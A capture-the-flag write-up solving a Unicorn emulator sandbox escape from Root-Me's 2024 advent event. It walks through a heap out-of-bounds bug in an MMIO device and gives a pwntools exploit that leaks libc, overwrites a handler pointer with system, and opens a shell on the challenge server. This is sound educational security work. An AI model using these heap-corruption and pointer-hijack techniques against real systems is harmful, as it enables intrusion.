# Root-Xmas Challenge 2024 - Day 23 - Gift Control Interface (Pwn)

**TL;DR:** Unicorn sandbox escape, heap out-of-bounds read/write in MMIO interface.

This challenge was part of the Root-Xmas Challenge which was
organized by [Root-Me](https://root-me.org). This event was an Advent
Calendar made with CTF challenges.

![challenge](./img/23-chall.png)

**Description:** 
> This year, to easily handle people's Christmas lists,
> the elves teamed up to develop a cutting-edge application: the Gift
> Control Interface. 
>
> Try it out and maybe you'll get a flag from Santa Claus!

## Introduction

There is quite a bunch of given files for this challenge.

```
$ tree
.
├── bin
│   ├── gci
├── docker
│   ├── docker-compose.yml
│   ├── Dockerfile
│   └── flag.txt
└── src
    ├── bin
    │   └── gci
    ├── emu.c
    ├── gci.c
    ├── include
    │   ├── emu.h
    │   ├── gci.h
    │   └── unicorn
    │       ├── arm64.h
    │       ├── [...] (unicorn stuff, not interesting)
    │       └── x86.h
    ├── lib
    │   ├── libunicorn.so
    │   └── libunicorn.so.2
    ├── main.c
    ├── Makefile
    └── obj
```

This challenge uses libc 2.39 and all protections are enabled.
```
$ checksec --file=gci
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   65 Symbols  No	0		3		gci
```

The code of the challenge is located in
`src/main.c`, `src/emu.c`, `src/gci.c` and their `.h` header
files. Let's take a look at them.

First of all, `main.c` is the entry point of the challenge. It reads
some code in input from `stdin`, and launch the emulation of this
code by calling `emu_launch` (which is defined in `emu.c`).

```c
#include <stdio.h>
#include <stdlib.h>

#include "emu.h"

void __attribute__((constructor)) setup(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stdin, NULL, _IONBF, 0);
}

static size_t read_long(void)
{
    char buf[0x20] = { 0 };
    fgets(buf, sizeof(buf) - 1, stdin);
    return strtoul(buf, NULL, 10);
}

int main(int argc, char *argv[]) {
    printf("Ho ho ho! Welcome to the GCI (Gift Control Interface)\n");
    printf("You can write your gift list here and I will execute it for you\n");

    printf("Code length (%d max): ", CODE_SIZE);
    size_t code_len = read_long();

    void *code = malloc(code_len);
    if (!code) {
        fputs("Failed to allocate memory\n", stderr);
        return 1;
    }

    printf("Enter your code: ");
    fread(code, 1, code_len, stdin);

    printf("Executing your code...\n");

    return emu_launch(code, code_len);
}
```

The emulator is defined in `emu.c`. It first maps memory for the stack
and sets `rsp` to its bottom. Then, it maps memory for the code and
copy the input code there. More surprisingly, it setups a MMIO
interface for memory area at `GCI_START` (defined as `0xcafe0000` in
`emu.h`). Finally, the emulation can start.

```c
#include <unicorn/unicorn.h>

#include <emu.h>
#include <gci.h>

static bool emu_init(uc_engine **uc, void *code, size_t code_len)
{
    uc_engine *_uc;
    uc_err err;
    
    if ((err = uc_open(UC_ARCH_X86, UC_MODE_64, &_uc)) != UC_ERR_OK) {
        *uc = NULL;
        return false;
    }

    // Map stack
    uc_mem_map(_uc, STACK_START, STACK_SIZE, UC_PROT_READ | UC_PROT_WRITE);
    uc_reg_write(_uc, UC_X86_REG_RSP, &(uint64_t) { STACK_START + STACK_SIZE });

    // Map code
    uc_mem_map(_uc, CODE_START, CODE_SIZE, UC_PROT_ALL);
    uc_mem_write(_uc, CODE_START, code, code_len);

    // Setup MMIO
    uc_mmio_map(_uc, GCI_START, PAGE_SIZE, gci_read, NULL, gci_write, NULL);

    *uc = _uc;

    return true;
}

int emu_launch(void *code, size_t code_len)
{
    uc_engine *uc = NULL;
    uc_err err;
    if (!emu_init(&uc, code, code_len)) {
        return 1;
    }

    free(code);

    err = uc_emu_start(uc, CODE_START, CODE_START + code_len, 0, 0);

    return 0;
}
```

But, what is a MMIO (Memory Mapped I/O) interface? 

It allows to perform reads/writes on some device by reading/writing at
some given memory mapping, in the same address space as the rest of
the memory. Basically, when one does a memory read such as `mov rdi,
0xcafe0042 ; mov rax, qword ptr [rdi]`, it will call the `read`
function of the device, with some parameter equal to 0x42, and the
result will be stored in `rax`. Similarly, we can write data to the
device.

Here, the device inputs/outputs are handled by `gci_read` and
`gci_write` functions that are defined in `gci.c`.

Finally, the core logic is in `gci.c`:

```c
#include <gci.h>
#include <unicorn/unicorn.h>

static gci_context gci_ctx;

static void gci_handle_command(uc_engine *uc, uint64_t command)
{
    switch (command) {
    case GCI_CMD_INIT:
        if (gci_ctx.gift_list)
            free(gci_ctx.gift_list);

        gci_ctx.gift_list = malloc(gci_ctx.gift_max * sizeof(gift));
        gci_ctx.gift_count = 0;
        break;
    case GCI_CMD_ADD_GIFT:
        if (gci_ctx.gift_list && gci_ctx.gift_count < gci_ctx.gift_max) {
            gci_ctx.gift_list[gci_ctx.gift_count++] = gci_ctx.gift_to_add;
        }
        break;
    case GCI_CMD_GET_GIFT:
        if (gci_ctx.gift_list && gci_ctx.gift_idx < gci_ctx.gift_max) {
            gci_ctx.gift_to_get = gci_ctx.gift_list[gci_ctx.gift_idx];
        }
        break;
    case GCI_CMD_EDIT_GIFT:
        if (gci_ctx.gift_list && gci_ctx.gift_idx < gci_ctx.gift_max) {
            gci_ctx.gift_list[gci_ctx.gift_idx] = gci_ctx.gift_to_add;
        }
        break;
    case GCI_CMD_SUBMIT:
        if (gci_ctx.gift_list == NULL || gci_ctx.gift_count == 0) 
            break;

        printf("Your gift list has been submitted to santa !\n");

        printf("Gifts:\n");
        for (size_t i = 0; i < gci_ctx.gift_count; i++) {
            printf("#%lu: %#x\n", i, gci_ctx.gift_list[i]);
        }

        uc_emu_stop(uc);
        break;
    default:
        break;
    }
}

uint64_t gci_read(uc_engine *uc, uint64_t offset, unsigned size, void *user_data)
{
    switch (offset) {
    case GCI_CTRL_GIFT:
        return gci_ctx.gift_to_get;
    case GCI_CTRL_GIFT_MAX:
        return gci_ctx.gift_max;
    case GCI_CTRL_GIFT_IDX:
        return gci_ctx.gift_idx;
    case GCI_CTRL_CMD:
    default:
        return 0;
    }
}

void gci_write(uc_engine *uc, uint64_t offset, unsigned size, uint64_t value, void *user_data)
{
    switch (offset) {
    case GCI_CTRL_GIFT:
        gci_ctx.gift_to_add = value;
        break;
    case GCI_CTRL_GIFT_MAX:
        gci_ctx.gift_max = value;
        break;
    case GCI_CTRL_GIFT_IDX:
        gci_ctx.gift_idx = value;
        break;
    case GCI_CTRL_CMD:
        gci_handle_command(uc, value);
        break;
    default:
        break;
    }
}
```

The behavior of reads/writes through the MMIO only depends on the
offset and, for writes, the value written. The size of read/written
data is irrelevant, as well as the extra parameter `user_data` (which will always be NULL here according to the [source code](https://github.com/unicorn-engine/unicorn/blob/master/include/unicorn/unicorn.h#L1093) of `uc_mmio_map`).

## I/O Commands

`gci_read` and `gci_write` both manipulate a global `gci_context`
which is defined as follows in `gci.h`:

```c
typedef struct gci_context
{
    size_t gift_count;
    size_t gift_max;
    size_t gift_idx;
    gift *gift_list;
    gift gift_to_get;
    gift gift_to_add;
} gci_context;
```

where `gift` is an alias for `uint32_t`.

`gift_to_add`, `gift_max` and `gift_idx` can be arbitrarily set by
doing MMIO writes respectively at offsets `GCI_CTRL_GIFT` (defined as
0 in `gci.h`), `GCI_CTRL_GIFT_MAX` (= 8) and `GCI_CTRL_GIFT_IDX` (=
16). Similarly, `gift_to_add`, `gift_max` and `gift_idx` can be read
with MMIO reads. Finally, writing to `GCI_CTRL_CMD` allows to execute
a "command" corresponding to the value written.

The possible commands are:
- Initialize a gift list with size `gift_max`,
- Append `gift_to_add` to the end of the list (index `gift_count`), 
- Get the gift at index `gift_idx`
- Edit the gift at index `gift_idx`
- Submit the list and stop the emulation.

## The Vulnerability

My first thought was: when we get/edit a gift (commands
`GCI_CMD_GET_GIFT` and `GCI_CMD_EDIT_GIFT`), there is a check to avoid
reading at an index greater than `gift_max`, but no checks that the
index is positive.

I just forgot that `gift_idx` has type `size_t`, which is unsigned. :')

However, there is still a real vulnerability: the list is initialized
by allocating a chunk of size `gift_max * sizeof(gift)`. But
`gift_max` can be modified arbitrarily after allocation! Thus, the
check in `get_gift` is insufficient since we can set `gift_max` to a
very big value and read/write out-of-bounds of the allocated chunk.

As a result, we have a heap out-of-bounds read/write primitive.

It's now time to look for targets in the heap.

## The Target

A few weeks before the CTF, I heard about a simple QEMU escape
challenge through an out-of-bounds access in a MMIO interface at
SECCON CTF 13 Quals. Since I had never done that before and I was
curious to see to what a sandbox escape could be like, I read [this
write-up](https://chovid99.github.io/posts/seccon-ctf-13-quals/#babyqemu)
by Chovid99.

The present challenge reminded me of this write-up. It gave me the
idea to overwrite the pointer to `gci_read` in the MMIO structure, in
case it was stored in the heap. And... it turns out we are lucky.

```
gef> print gci_read
$2 = {<text variable, no debug info>} 0x5640734938d9 <gci_read>
gef> find 0x5640734938d9
[+] Searching '\xd9\x38\x49\x73\x40\x56' in whole memory
[+] In '[heap]' (0x5640774f2000-0x5640775a3000 [rw-])
  0x5640774f7450:    d9 38 49 73 40 56 00 00  00 00 00 00 00 00 00 00    |  .8Is@V..........  |
```

As a result, we can use the heap out-of-bounds write to overwrite this
pointer and control `rip`. But the road to the flag is far from being ended.

Indeed, we have two main limitations:
- To overwrite the pointer with `@system` or a one gadget, we have to
  leak the libc base address,
- We do not control the value of `rdi` when controlling the
  instruction pointer: it always points to the `uc_engine` structure,
  the first argument of `gci_read`.
  
## Libc Leak

A common idea to leak a pointer to libc in the head is to find a chunk
in the unsorted bin, where `fd` and `bk` pointers are libc pointers
(to `main_arena`). Here, we are lucky again:

```
pwndbg> bins
tcachebins
0x30 [  5]: 0x5576a3a7f030 —▸ 0x5576a3a9b250 —▸ 0x5576a3a9af90 —▸ 0x5576a3a7e640 —▸ [...]
0x410 [  2]: 0x5576a3a7e180 —▸ 0x5576a3a7e940 ◂— 0
fastbins
empty
unsortedbin
all: 0x5576a3ad9610 —▸ 0x7f1deca03b20 (main_arena+96) ◂— 0x5576a3ad9610
smallbins
empty
largebins
0x6c0-0x6f0: 0x5576a3a87690 —▸ 0x7f1deca03fc0 (main_arena+1280) ◂— 0x5576a3a87690
0xe00-0xff0: 0x5576a3acdf10 —▸ 0x7f1deca04130 (main_arena+1648) ◂— 0x5576a3acdf10
pwndbg> x/4gx 0x5576a3ad9610
0x5576a3ad9610:	0x0000000000000000	0x0000000000017001
0x5576a3ad9620:	0x00007f1deca03b20	0x00007f1deca03b20
```

By reading out-of-bounds at the correct offset, we get a pointer to
libc. However, it is not very convenient since the leak is stored in a
register of the emulated program. Moreover we can only read data 4
bytes by 4 bytes. We first store the 4 first bytes to `rax`, copy them
to `rbx`, shift them 4 bytes left in `rbx`, read the 4 next bytes to
`rax` and finally add `rbx` to `rax`.

A quick win would have been to use a one gadget (thus not requiring to
control any registers) but unfortunately, the requirements on
registers/stack to use one gadgets were not met here. How frustrating
it was. :(

By substracting the right offset to `rax`, we can get the address of
`system` in `rax` and overwrite the pointer to `gci_read` with it
though.

## Actually "Controlling" `rdi`

What struck me in my despair is that the `uc_engine` structure is
actually stored... in the heap!

```
RAX  0x55a5fd8b2450 —▸ 0x55a5f65d38d9 (gci_read) ◂— endbr64
[...]
RDX  4
RDI  0x55a5fd8ad4d0 ◂— 0x800000004     <------ In the heap!
RSI  0xc
[...]
RIP  0x55a5f65d3939 (gci_write+8) ◂— sub rsp, 0x30
─
```

Therefore, if we manage to allocate the gift list before the structure
and overwrite the first bytes of the structure with "sh" (with the OOB
write) without making everything crash, it would be good!

It's dirty, very dirty. But it turns out that it actually works. I
would be curious to know what's the purpose of the first bytes of the
`uc_engine` structure.

Luckily for us, after the code is copied from user input, its buffer
is freed. Thus we have a chunk in tcache we can use to allocate our
gift list before the `uc_engine` structure.

```
0x55a5fd8ad290	0x0000000000000000	0x0000000000000231	........1.......
0x55a5fd8ad2a0	0x000000055a5fd8ad	0x00c76ed1283822c8	.._Z....."8(.n..	 <-- tcachebins[0x230][0/1]
0x55a5fd8ad2b0	0x0018bf4817894800	0xc74800000000cafe	.H..H.........H.
0x55a5fd8ad2c0	0x17894800001337c2	0x0000cafe0008bf48	.7...H..H.......
[...]
0x55a5fd8ad4b0	0xfe0008bf48178948	0x078b4800000000ca	H..H.........H..
0x55a5fd8ad4c0	0x0000000000000000	0x0000000000003a31	........1:......
0x55a5fd8ad4d0	0x0000000800000004	0x0000000000000000	................     <---- uc_engine structure
0x55a5fd8ad4e0	0x000055a5fd8b0f40	0x000055a5fd8b25a0	@....U...%...U..
```

We have however to allocate a gift list with length such that `malloc`
will use the tcache chunk. For convenience, we instead allocate a gift
list with fixed size and add padding to the input code to match both
lengths.

## The Exploit

For convenience, I wrote wrapper functions in Python to do operations
on the MMIO interface. For instance to set `gift_idx`, read the
gift at this index and store it in `rax`:

```python
def set_gift_idx(gift_idx):
	payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT_IDX)
	payload += 'mov rdx, %d ;\n' % gift_idx
	payload += 'mov qword ptr [rdi], rdx ;\n'
	return payload

def get_gift():
	payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_CMD)
	payload += 'mov rdx, %d ;\n' % GCI_CMD_GET_GIFT
	payload += 'mov qword ptr [rdi], rdx ;\n'
	return payload
	
def get_gift_to_get():
	payload = 'mov rdi, %d ;\n' % (GCI_START + GCI_CTRL_GIFT)
	payload += 'mov rax, qword ptr [rdi] ;\n'
	return payload
```

finally, to read 4 bytes at offset `i` and store them in `rax`,

```python
def get4(i):
    payload = set_gift_idx(i)
    payload += get_gift()
    payload += get_gift_to_get()
    return payload
```

All the assembly instructions of the payloads are concatenated at the
end and assembled using the `asm` pwntools function.

This is the main part of my exploit. The full code is available
[here](./src/23-gift_control_interface/bin/solve.py)

```python
def main():
    io = start()

    [...]
    
    code = set_gift_max(150)
    code += init_gift_list()
    code += set_gift_max((1<<64) - 1) # allows OOB access
    code += set_gift_to_add(0xcafebabe)
    code += add_gift()
    code += set4(152, 0x6873) # overwrite the first bytes of uc_engine with "sh"
    code += get8(97516)  # ptr to libc (main arena)
    code += 'sub rax, 0x1ab3e0 ;\n' # @system
    code += set8_val_rax(5240)  # overwrite pointer to gci_read
    code += get_gift_max() # trigger a read
    # print(code)

    code = asm(code)
    code += b'A' * (150*4 - len(code)) # padding to allocate gift list in tcache chunk
    
    io.sendlineafter(b'Code length (16384 max): ', str(len(code)).encode())
    io.sendafter(b'Enter your code: ', code)
    
    io.interactive()
```

```
$ python solve.py
[...]
[+] Opening connection to dyn-01.xmas.root-me.org on port 20690: Done
[*] Switching to interactive mode
Executing your code...
$ ls
flag.txt
gci
$ cat flag.txt
RM{Deer_s4nta_1_w4nt_4_Un1c0rn!}
```

**FLAG:** `RM{Deer_s4nta_1_w4nt_4_Un1c0rn!}`

## Conclusion and Intended Solution

Kudos to voydstack for this great challenge. I had never done in
practice a sandbox escape before, and this challenge was a very good
introduction to this kind of sorcery.

We discussed the challenge after I solved it, and there was a way
cleaner solution.

I noticed earlier while solving the challenge that there was a
RWX-mapped page (actually used by Unicorn's JIT) but I haven't found
how to take profit from it.

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
         Start                End Perm     Size Offset File
0x55fde7a9b000     0x55fde7a9c000 r--p     1000      0 /data/rlaspina/Documents/00-CTF/00-CTF/2024/xmas_rootme/23-gift_control_interface/bin/gci_patched
0x55fde7a9c000     0x55fde7a9d000 r-xp     1000   1000 /data/rlaspina/Documents/00-CTF/00-CTF/2024/xmas_rootme/23-gift_control_interface/bin/gci_patched
[...]
0x7f3d6d610000     0x7f3d6d611000 ---p     1000      0 [anon_7f3d6d610]
0x7f3d6da00000     0x7f3dad9ff000 rwxp 3ffff000      0 [anon_7f3d6da00]  <--- HERE !
0x7f3dad9ff000     0x7f3dada00000 ---p     1000      0 [anon_7f3dad9ff]
[...]
0x7f3daddff000     0x7f3dade03000 r--p     4000 1fe000 /data/rlaspina/Documents/00-CTF/00-CTF/2024/xmas_rootme/23-gift_control_interface/bin/libc.so.6
0x7f3dade03000     0x7f3dade05000 rw-p     2000 202000 /data/rlaspina/Documents/00-CTF/00-CTF/2024/xmas_rootme/23-gift_control_interface/bin/libc.so.6
```

OOB write to `uc_engine` structure was intended, but instead we could
have overwritten the pointer to the area where the emulated stack is
mapped to remap it to the RWX area. We can then write a shellcode
there by executing `push` instructions in the emulated code (the
RWX-area actually becomes our new "stack"). Finally we overwrite the
pointer to `gci_read` as we have done with the address of the
shellcode.

A lot more nice-looking, but a flag is a flag... :)
